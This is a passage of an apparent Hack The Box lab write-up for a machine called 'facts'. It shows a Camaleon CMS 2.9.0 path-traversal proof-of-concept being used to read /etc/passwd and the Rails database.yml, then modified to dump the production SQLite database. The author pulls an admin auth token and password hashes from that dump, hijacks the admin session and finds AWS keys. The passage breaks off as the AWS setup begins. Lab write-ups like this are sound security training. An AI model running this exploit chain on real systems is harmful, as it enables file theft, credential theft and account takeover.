+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, cookies<span style="color:#f92672">=</span>cookies, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>RequestException <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[!] Request error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">SystemExit</span>(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --------------------------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4) Response Handling</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --------------------------------------------------</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] HTTP Status: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Invalid authentication typically results in a redirect to the admin login page</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">302</span>:
+</span></span><span style="display:flex;"><span>    location <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;Location&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;/admin/login&#34;</span> <span style="color:#f92672">in</span> location:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] auth_token may be incorrect or expired (redirected to </span><span style="color:#e6db74">{</span>location<span style="color:#e6db74">}</span><span style="color:#e6db74">).&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Redirected to: </span><span style="color:#e6db74">{</span>location <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;(no Location header)&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">SystemExit</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Successful response</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Response preview:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    preview <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>text[:<span style="color:#ae81ff">3000</span>]
+</span></span><span style="display:flex;"><span>    print(preview)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(response<span style="color:#f92672">.</span>text) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3000</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">...output truncated...&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">SystemExit</span>(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Other failure conditions</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[!] Request failed.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">500</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[!] The file path may be invalid, or the server encountered an internal error.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[i] Response length: </span><span style="color:#e6db74">{</span>len(response<span style="color:#f92672">.</span>content)<span style="color:#e6db74">}</span><span style="color:#e6db74"> bytes&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">SystemExit</span>(<span style="color:#ae81ff">1</span>)</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://www.exploit-db.com/raw/52531 <span style="color:#f92672">&amp;&amp;</span> mv <span style="color:#ae81ff">52531</span> exploit.py</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I then executed the script by specifying the target URL, file path to request, and auth_token value:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# python3 exploit.py                         
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Camaleon CMS v2.9.0 - Path Traversal PoC <span style="color:#f92672">(</span>authorized testing only<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target base URL <span style="color:#f92672">(</span>example: http://target.com<span style="color:#f92672">)</span>: http://facts.htb/
+</span></span><span style="display:flex;"><span>File path to request <span style="color:#f92672">(</span>example: /etc/passwd<span style="color:#f92672">)</span>: /etc/passwd
+</span></span><span style="display:flex;"><span>auth_token value: P0ChR3_MlLL7nIOhmtlIvQ&amp;Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A128.0%29+Gecko%2F20100101+Firefox%2F128.0&amp;10.10.16.37
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> HTTP Status: <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Response preview:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>pollinate:x:103:1::/var/cache/pollinate:/bin/false
+</span></span><span style="display:flex;"><span>polkitd:x:991:991:User <span style="color:#66d9ef">for</span> polkitd:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>syslog:x:104:104::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span style="display:flex;"><span>landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
+</span></span><span style="display:flex;"><span>william:x:1001:1001::/home/william:/bin/bash
+</span></span><span style="display:flex;"><span>_laurel:x:101:988::/var/log/laurel:/bin/false</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p><strong>Note: the &ldquo;auth_token value&rdquo; is a cookie which can be found in the facts.htb session, as pictured below:</strong>
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/facts/authcookie.png" loading="lazy" decoding="async"
+  alt="authorization cookie">
+The exploit was able to reveal sensitive files such as <strong>/etc/passwd</strong>, and with that file, I was able to find two other users besides root: <strong>trivia</strong> and <strong>william</strong>.<br>
+ <br>
+After doing some more digging online, I found out that Camaleon CMS is Ruby on Rails based. With this information, I was able to find documentation on rails directory structure on <a href="https://www.geeksforgeeks.org/ruby/ruby-on-rails-directory-structure/"><strong>geeksforgeeks.org</strong></a>. The site revealed paths for some very sensitive database files, one of them being <strong>/config/database.yml</strong>.<br>
+ <br>
+I knew that <strong>/proc/self/cwd</strong> was a very common path for web applications to be running from, and so I was able to read the <strong>database.yml</strong> file by running the exploit script and searching for <strong>/proc/self/cwd/config/database.yml</strong>.</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# python3 exploit.py                         
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Camaleon CMS v2.9.0 - Path Traversal PoC <span style="color:#f92672">(</span>authorized testing only<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target base URL <span style="color:#f92672">(</span>example: http://target.com<span style="color:#f92672">)</span>: http://facts.htb/
+</span></span><span style="display:flex;"><span>File path to request <span style="color:#f92672">(</span>example: /etc/passwd<span style="color:#f92672">)</span>: /proc/self/cwd/config/database.yml
+</span></span><span style="display:flex;"><span>auth_token value: P0ChR3_MlLL7nIOhmtlIvQ&amp;Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A128.0%29+Gecko%2F20100101+Firefox%2F128.0&amp;10.10.16.37
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> HTTP Status: <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Response preview:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># SQLite. Versions 3.8.0 and up are supported.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   gem install sqlite3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   Ensure the SQLite 3 gem is defined in your Gemfile</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   gem &#34;sqlite3&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>default: &amp;default
+</span></span><span style="display:flex;"><span>  adapter: sqlite3
+</span></span><span style="display:flex;"><span>  pool: &lt;%<span style="color:#f92672">=</span> ENV.fetch<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;RAILS_MAX_THREADS&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">}</span> %&gt;
+</span></span><span style="display:flex;"><span>  timeout: <span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>development:
+</span></span><span style="display:flex;"><span>  &lt;&lt;: *default
+</span></span><span style="display:flex;"><span>  database: storage/development.sqlite3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Warning: The database defined as &#34;test&#34; will be erased and</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># re-generated from your development database when you run &#34;rake&#34;.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Do not set this db to the same as development or production.</span>
+</span></span><span style="display:flex;"><span>test:
+</span></span><span style="display:flex;"><span>  &lt;&lt;: *default
+</span></span><span style="display:flex;"><span>  database: storage/test.sqlite3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Store production database in the storage/ directory, which by default</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># is mounted as a persistent Docker volume in config/deploy.yml.</span>
+</span></span><span style="display:flex;"><span>production:
+</span></span><span style="display:flex;"><span>  primary:
+</span></span><span style="display:flex;"><span>    &lt;&lt;: *default
+</span></span><span style="display:flex;"><span>    database: storage/production.sqlite3
+</span></span><span style="display:flex;"><span>  cache:
+</span></span><span style="display:flex;"><span>    &lt;&lt;: *default
+</span></span><span style="display:flex;"><span>    database: storage/production_cache.sqlite3
+</span></span><span style="display:flex;"><span>    migrations_paths: db/cache_migrate
+</span></span><span style="display:flex;"><span>  queue:
+</span></span><span style="display:flex;"><span>    &lt;&lt;: *default
+</span></span><span style="display:flex;"><span>    database: storage/production_queue.sqlite3
+</span></span><span style="display:flex;"><span>    migrations_paths: db/queue_migrate
+</span></span><span style="display:flex;"><span>  cable:
+</span></span><span style="display:flex;"><span>    &lt;&lt;: *default
+</span></span><span style="display:flex;"><span>    database: storage/production_cable.sqlite3
+</span></span><span style="display:flex;"><span>    migrations_paths: db/cable_migrate</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The file revealed the path of the production database: <strong>/storage/production.sqlite3</strong>. Since the exploit I had downloaded earlier was only for reading files, I rewrote it slightly so that it was capable of dumping SQL databases:<br>
+ <br>
+So this:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">python</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Successful response</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Response preview:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    preview <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>text[:<span style="color:#ae81ff">3000</span>]
+</span></span><span style="display:flex;"><span>    print(preview)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(response<span style="color:#f92672">.</span>text) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3000</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">...output truncated...&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">SystemExit</span>(<span style="color:#ae81ff">0</span>)</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p> <br>
+Turned to this:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">python</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Successful response</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Database dumped.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;dump.sqlite3&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>write(response<span style="color:#f92672">.</span>content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">SystemExit</span>(<span style="color:#ae81ff">0</span>)</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I then ran the exploit and was able to obtain a dump of <strong>production.sqlite3</strong>. This was a big step toward getting a foothold on the system, and the tables were very promising:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# sqlite3 dump.sqlite3 
+</span></span><span style="display:flex;"><span>SQLite version 3.46.1 2024-08-13 09:16:08
+</span></span><span style="display:flex;"><span>Enter <span style="color:#e6db74">&#34;.help&#34;</span> <span style="color:#66d9ef">for</span> usage hints.
+</span></span><span style="display:flex;"><span>sqlite&gt; .tables
+</span></span><span style="display:flex;"><span>action_mailbox_inbound_emails     cama_media                      
+</span></span><span style="display:flex;"><span>action_text_rich_texts            cama_metas                      
+</span></span><span style="display:flex;"><span>active_storage_attachments        cama_posts                      
+</span></span><span style="display:flex;"><span>active_storage_blobs              cama_term_relationships         
+</span></span><span style="display:flex;"><span>active_storage_variant_records    cama_term_taxonomy              
+</span></span><span style="display:flex;"><span>ar_internal_metadata              cama_users                      
+</span></span><span style="display:flex;"><span>cama_comments                     plugins_attacks                 
+</span></span><span style="display:flex;"><span>cama_custom_fields                plugins_contact_forms           
+</span></span><span style="display:flex;"><span>cama_custom_fields_relationships  schema_migrations               
+</span></span><span style="display:flex;"><span>sqlite&gt; </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>By taking a look at the <strong>cama_users</strong> table, I was able to find a database entry for the admin user of <strong>facts.htb</strong>:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlite&gt; SELECT * FROM cama_users;
+</span></span><span style="display:flex;"><span>1|admin|admin|admin@local.com<span style="color:#f92672">||</span>$2a$12$9lLBXaBzcTxohKjxX08aR.WmE7qyhwpl0NGGBLbKDi6t.PB5zdJcK|1QGOA6YxgFANPE6XlGYPpg<span style="color:#f92672">||||</span>2026-01-08 15:30:12.955853|2025-09-07 21:57:52.634896|2026-01-08 15:30:12.961004|-1<span style="color:#f92672">||</span>|1|Administrator|
+</span></span><span style="display:flex;"><span>5|fakeadmin|client|attacker@evil.com<span style="color:#f92672">||</span>$2a$12$ghGG5nwdqjg5Db8WVULqY.7HtAlUZ3.S3ipeqeKJmiIPGGFyqCRBa|P0ChR3_MlLL7nIOhmtlIvQ<span style="color:#f92672">||||</span>2026-05-12 17:04:46.178229|2026-05-12 17:04:17.048383|2026-05-12 17:04:46.181352|-1<span style="color:#f92672">||</span>|1|esteban|exploits
+</span></span><span style="display:flex;"><span>sqlite&gt; </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The entry seemed to contain a username, email, password (hashed with bcrypt), and most importantly, an <em>authorization token</em>.<br>
+ <br>
+I copied this token, went back to my web browser (still logged into my standard user account) and replaced my original auth_token with it.<br>
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/facts/tokenescalation.png" loading="lazy" decoding="async"
+  alt="replacing token">
+I refreshed the page, and BOOM. Admin access granted!
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/facts/adminaccess.png" loading="lazy" decoding="async"
+  alt="admin access granted">
+I noticed a bunch of tools on the left sidebar of the dashboard, however, almost all of them were a waste of time. There were not any plugins I could leverage, media that stood out, or content that I shouldn&rsquo;t have seen.<br>
+ <br>
+However, investigating the <em>settings</em> page revealed AWS access keys and secret keys!<br>
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/facts/aws.png" loading="lazy" decoding="async"
+  alt="aws keys">
+With this information, I connected to the AWS bucket on my attacker machine:<br>
+ <br>
+Setting up the configuration:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
